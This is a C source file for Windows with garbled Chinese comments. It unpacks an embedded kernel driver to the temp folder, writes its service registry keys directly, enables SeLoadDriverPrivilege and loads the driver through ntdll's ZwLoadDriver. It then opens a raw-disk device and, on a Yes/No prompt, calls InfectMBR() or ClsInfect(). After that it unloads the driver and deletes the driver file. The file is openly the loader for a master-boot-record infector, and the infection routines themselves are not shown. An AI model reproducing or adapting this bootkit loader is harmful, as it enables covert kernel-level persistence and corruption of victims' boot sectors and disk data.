#include <Windows.h>
#include <shlwapi.h>
#include "resource.h"



//---------- ���ļ���Ҫ������,�������ļ�����(����ʼ��)�� ȫ�ֱ��� ----------//
extern	char	g_szSystemPath[MAX_PATH];
extern	HANDLE	g_hDriver;
//---------- ���ļ���Ҫ������,�������ļ�����(��ʵ��)�� �ӳ��� --------------//
DWORD	DiskReadWrite(unsigned __int64 LBA, USHORT usSectorCount, char *pBuffer, DWORD dwBufSize, DWORD dwFlags);
//--------------------------------------------------------------------------//

char	g_szTempPath[MAX_PATH];

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//////ж������(������ʽ)
////DWORD UnLoadDriver(char *szSvcName)
////{
////	DWORD			dwResult = 0,dwError = 0;
////	char			szMsg[1024], szSvcKey[1024], *pFailedFnName = NULL;
////	SC_HANDLE		hSCM = NULL, hService = NULL;
////	SERVICE_STATUS	sa;
////
////
////	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
////	if(hSCM == NULL)
////	{
////		pFailedFnName = "OpenSCManager";
////		goto __DISPLAYERRORMSG;
////	}
////
////	hService = OpenService(hSCM, szSvcName, SERVICE_START);
////	if(hService == NULL)
////	{
////		pFailedFnName = "OpenService";
////		goto __DISPLAYERRORMSG;
////	}
////	
////	memset(&sa, 0, sizeof(sa));
////	if(QueryServiceStatus(hService, &sa) == FALSE)
////	{
////		pFailedFnName = "QueryServiceStatus";
////		goto __DISPLAYERRORMSG;
////	}
////	if(sa.dwCurrentState != SERVICE_STOPPED)
////	{
////		if(ControlService(hService, SERVICE_CONTROL_STOP, &sa) == FALSE)
////		{
////			pFailedFnName = "ControlService";
////			goto __DISPLAYERRORMSG;
////		}
////	}
////	if(DeleteService( hService ) == FALSE)
////	{
////		pFailedFnName = "DeleteService";
////		goto __DISPLAYERRORMSG;
////	}
////
////	goto __END;
////
////
////__DISPLAYERRORMSG:
////	dwResult = dwError = GetLastError();
////	wsprintf(szMsg, "UnLoadDriver -> %s Failed! Error Code: %d", pFailedFnName, dwError);
////	MessageBox(NULL, szMsg, "Error", MB_OK);
////
////__END:
////	//�������, ɾ��������ص�ע�����, ���������������Ҫ��ͬ!!!
////	wsprintf(szSvcKey, "SYSTEM\\CurrentControlSet\\Services\\%s", szSvcName);
////	SHDeleteKey(HKEY_LOCAL_MACHINE, szSvcKey);
////
////	if(hSCM != NULL)
////	{
////		if(hService != NULL)
////		{
////			CloseServiceHandle( hService );
////		}
////		CloseServiceHandle( hSCM );
////	}
////
////	return dwResult;
////}
////
//////��������(������ʽ)
////DWORD LoadDriver(char *pFilePath, char *pSvcName)
////{
////	DWORD		dwResult = 0,dwError = 0;
////	char		szSvcName[MAX_PATH], szMsg[1024], szSvcKey[1024], *pFailedFnName = NULL;
////	SC_HANDLE	hSCM = NULL, hService = NULL;
////	BOOL		bCreateRegKey = FALSE;
////
////
////	if(pSvcName != NULL)
////	{
////		lstrcpy(szSvcName, pSvcName);
////	}
////	else
////	{
////		//�ļ�����Ϊ��������
////		lstrcpy(szSvcName, strrchr(pFilePath, '\\') + 1);
////		*(DWORD*)strrchr(szSvcName, '.') = 0x00000000;	//ȥ����չ��
////	}
////
////	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
////	if(hSCM == NULL)
////	{
////		pFailedFnName = "OpenSCManager";
////		goto __DISPLAYERRORMSG;
////	}
////
////	hService = OpenService(hSCM, szSvcName, SERVICE_START);
////	if(hService == NULL)
////	{
////		hService = CreateService(hSCM,
////								szSvcName,
////								szSvcName,
////								SERVICE_ALL_ACCESS,
////								SERVICE_KERNEL_DRIVER,
////								SERVICE_DEMAND_START,
////								SERVICE_ERROR_NORMAL,
////								pFilePath,
////								NULL,
////								NULL,
////								NULL,
////								NULL,
////								NULL);
////		if(hService == NULL)
////		{
////			pFailedFnName = "CreateService";
////			goto __DISPLAYERRORMSG;
////		}
////
////		bCreateRegKey = TRUE;
////	}
////
////	if( StartService(hService, 0, NULL) == FALSE )
////	{
////		pFailedFnName = "StartService";
////		goto __DISPLAYERRORMSG;
////	}
////
////	goto __END;
////
////
////__DISPLAYERRORMSG:
////	dwResult = dwError = GetLastError();
////	wsprintf(szMsg, "LoadDriver -> %s Failed! Error Code: %d", pFailedFnName, dwError);
////	MessageBox(NULL, szMsg, "Error", MB_OK);
////
////	//ɾ���������, ��ɾ����ص�ע�����
////	if(hService != NULL)
////	{
////		DeleteService( hService );
////	}
////	if(bCreateRegKey == TRUE)
////	{
////		wsprintf(szSvcKey, "SYSTEM\\CurrentControlSet\\Services\\%s", szSvcName);
////		SHDeleteKey(HKEY_LOCAL_MACHINE, szSvcKey);
////	}
////	
////
////__END:
////	if(hSCM != NULL)
////	{
////		if(hService != NULL)
////		{
////			CloseServiceHandle( hService );
////		}
////		CloseServiceHandle( hSCM );
////	}
////	
////	return dwResult;
////}

//�� ... ��Ȩ
BOOL EnablePrivilege(char *szPrivilege)
{
	BOOL	bStatus = FALSE;
	LUID	DestLuid;

	if(LookupPrivilegeValue(NULL, szPrivilege, &DestLuid) == TRUE)
	{
		HANDLE	hProcess = NULL, hToken = NULL;
		

		hProcess = GetCurrentProcess();
		OpenProcessToken(hProcess, TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken);
		if(hToken != NULL)
		{
			TOKEN_PRIVILEGES	TokenPrilivege;

			
			TokenPrilivege.PrivilegeCount = 1;
			TokenPrilivege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			TokenPrilivege.Privileges[0].Luid = DestLuid;
			if(AdjustTokenPrivileges(hToken, FALSE, &TokenPrilivege, sizeof(TokenPrilivege), NULL, 0) == TRUE)
			{
				bStatus = TRUE;
			}
			CloseHandle( hToken );
		}
		CloseHandle( hProcess );
	}

	return bStatus;
}

//ͨ�� ntdll.dll �� ZwLoadDriver ����������
DWORD MyZwLoadOrUnloadDriver(char *szFilePath, char *szSvcName, DWORD dwFlags)
{
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
}UNICODE_STRING, *PUNICODE_STRING;

typedef	long (__stdcall *DEF_ZwLoadOrUnloadDriver)(
    IN PUNICODE_STRING  DriverServiceName
    );

	DWORD				dwResult = 0;
	HMODULE				hNtdll = NULL;
	char				*pFucnName = NULL, szSvcKey[1024];
	wchar_t				wSvcName[512], wSvcKey[1024];
	UNICODE_STRING		usSvcKey;
	DEF_ZwLoadOrUnloadDriver	PROZwLoadOrUnloadDriver = NULL;


	//�˴�ע�����
	wsprintf(szSvcKey, "System\\CurrentControlSet\\Services\\%s", szSvcName);

	//�� ZwLoadDriver ���� ZwUnloadDriver
	if(dwFlags == 1)
	{
		pFucnName = "ZwLoadDriver";
	}
	else if(dwFlags == 2)
	{
		pFucnName = "ZwUnloadDriver";
	}
	else
	{
		dwResult = 1;
		MessageBox(NULL, "���� dwFlags ����, ֻ���� 1 ���� 2", "Error", MB_ICONERROR);
		goto __END;
	}

	//��ȡ������ַ
	hNtdll = GetModuleHandle( "ntdll.dll" );
	PROZwLoadOrUnloadDriver = (DEF_ZwLoadOrUnloadDriver)GetProcAddress(hNtdll, pFucnName);
	if(PROZwLoadOrUnloadDriver == NULL)
	{
		dwResult = GetLastError();
		MessageBox(NULL, "�޷���ȡ ZwLoadDriver ���� ZwUnloadDriver �����ĵ�ַ!", "Error", MB_ICONERROR);
		goto __END;
	}

	//����ע�����
	if(dwFlags == 1)
	{
		DWORD	dwKeyData = 0;
		char	szImagePath[MAX_PATH], szValueData[1024];


		lstrcpy(szValueData, szSvcName);
		SHSetValue(HKEY_LOCAL_MACHINE, szSvcKey, "DisplayName", REG_SZ, szValueData, (lstrlen( szValueData ) + 1));
		wsprintf(szImagePath, "\\??\\%s", szFilePath);
		SHSetValue(HKEY_LOCAL_MACHINE, szSvcKey, "ImagePath", REG_EXPAND_SZ, szImagePath, (lstrlen( szImagePath ) + 1));
		dwKeyData = 3;
		SHSetValue(HKEY_LOCAL_MACHINE, szSvcKey, "Start", REG_DWORD, &dwKeyData, sizeof(dwKeyData));
		dwKeyData = 1;
		SHSetValue(HKEY_LOCAL_MACHINE, szSvcKey, "Type", REG_DWORD, &dwKeyData, sizeof(dwKeyData));
		dwKeyData = 1;
		SHSetValue(HKEY_LOCAL_MACHINE, szSvcKey, "ErrorControl", REG_DWORD, &dwKeyData, sizeof(dwKeyData));
	}

	//����
	MultiByteToWideChar(CP_ACP, 0, szSvcName, -1, wSvcName, (sizeof(wSvcName) / sizeof(wchar_t)));
	wsprintfW(wSvcKey, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s", wSvcName);
	usSvcKey.Buffer = wSvcKey;
	usSvcKey.Length = (USHORT)(lstrlenW( wSvcKey ) * 2);
	usSvcKey.MaximumLength = usSvcKey.Length;

	//�� SeLoadDriverPrivilege ��Ȩ
	EnablePrivilege("SeLoadDriverPrivilege");

	//ִ�в���
	if( (dwResult = PROZwLoadOrUnloadDriver( &usSvcKey )) != 0)
	{
		if(dwFlags == 1)
		{
			MessageBox(NULL, "ZwLoadDriver ʧ��!", "Error", MB_ICONERROR);
			goto __END;
		}
		else
		{
			MessageBox(NULL, "ZwUnloadDriver ʧ��!", "Error", MB_ICONERROR);
			goto __END;
		}
	}

	//ɾ��ע����� �� �����ļ�
	if(dwFlags == 2 || dwResult != 0)
	{
		if( (dwResult = SHDeleteKey(HKEY_LOCAL_MACHINE, szSvcKey)) != 0 )
		{
			MessageBox(NULL, "ɾ��ע����� ʧ��!", "Error", MB_ICONERROR);
			goto __END;
		}

		DeleteFile( szFilePath );
	}

__END:
	return dwResult;
}

//������д��һ���½��ļ�
BOOL WriteDataToFile(TCHAR *pszFilePath, void *pData, DWORD dwDateSize)
{
	HANDLE	hFile = INVALID_HANDLE_VALUE;
	DWORD	dwByte = 0;


	hFile = CreateFile(pszFilePath, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	WriteFile(hFile, pData, dwDateSize, &dwByte, NULL);
	CloseHandle( hFile );

	return TRUE;
}

//�ͷ���Դ���ļ�
BOOL Reresource(char *szFilePath, HMODULE hModule, int iReID)
{
	BOOL	bStatus = TRUE;
	char	*pFileByte = NULL;
	HRSRC	hResource = NULL;
	HGLOBAL pLoad = NULL;
	DWORD	dwSize = 0;


	hResource = FindResource(hModule, MAKEINTRESOURCE( iReID ), "FILE");
	dwSize = SizeofResource(hModule, hResource);
	pLoad = LoadResource(hModule, hResource);
	LockResource( pLoad );

	pFileByte = (char*)VirtualAlloc(NULL, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pFileByte, pLoad, dwSize);
	FreeResource( pLoad );

	////Decode(pFileByte + sizeof(DWORD), (dwSize - sizeof(DWORD)), *(DWORD*)pFileByte);
	////*(DWORD*)pFileByte = 0x00905A4D;//�ָ�'MZ'
	bStatus = WriteDataToFile(szFilePath, pFileByte, dwSize);
	
	VirtualFree(pFileByte, 0, MEM_RELEASE);

	return bStatus;
}

//Entry
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	#define		DRINAME				"00RWDisk"
	#define		DEVICESYMBOLLINK	"\\\\.\\TestStorage"

	DWORD	dwResult = 0;
	char	szDriFilePath[MAX_PATH], szMsg[1024];


	GetSystemDirectory(g_szSystemPath, sizeof(g_szSystemPath));
	GetTempPath(sizeof(g_szTempPath), g_szTempPath);

	wsprintf(szDriFilePath, "%s%s.sys", g_szTempPath, DRINAME);
	if(PathFileExists( szDriFilePath ) == TRUE)
	{
		DeleteFile( szDriFilePath );
	}

	Reresource(szDriFilePath, NULL, FILE_SYS);
	if( (dwResult = MyZwLoadOrUnloadDriver(szDriFilePath, DRINAME, 1)) != 0 )
	{
		wsprintf(szMsg, "%s ʧ��, ״̬��: 0x%.8X", "��������", dwResult);
		MessageBox(NULL, szMsg, "����", MB_ICONERROR);
		goto __END;
	}
	//�ٴ���֤�����Ƿ�����Ѽ���
	g_hDriver = CreateFile(DEVICESYMBOLLINK, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if(g_hDriver == INVALID_HANDLE_VALUE)
	{
		wsprintf(szMsg, "%s ʧ��, ״̬��: %d", "������", GetLastError());
		MessageBox(NULL, szMsg, "����", MB_ICONERROR);
		goto __END;
	}

	//================================= �������� ================================//
	void InfectMBR();
	void ClsInfect();

	if(MessageBox(NULL, "\"��\" ���и�Ⱦ, \"��\"��������", "!!!1������!!!", MB_YESNO) == IDYES)
	{
		InfectMBR();
	}
	else
	{
		ClsInfect();
	}

	//===========================================================================//
	CloseHandle( g_hDriver );
	if( (dwResult = MyZwLoadOrUnloadDriver(szDriFilePath, DRINAME, 2)) != 0 )	//��ɾ�������ļ�
	{
		wsprintf(szMsg, "%s ʧ��, ״̬��: 0x%.8X", "ж������", dwResult);
		MessageBox(NULL, szMsg, "����", MB_ICONERROR);
		goto __END;
	}

__END:
	ExitProcess( 0 );
}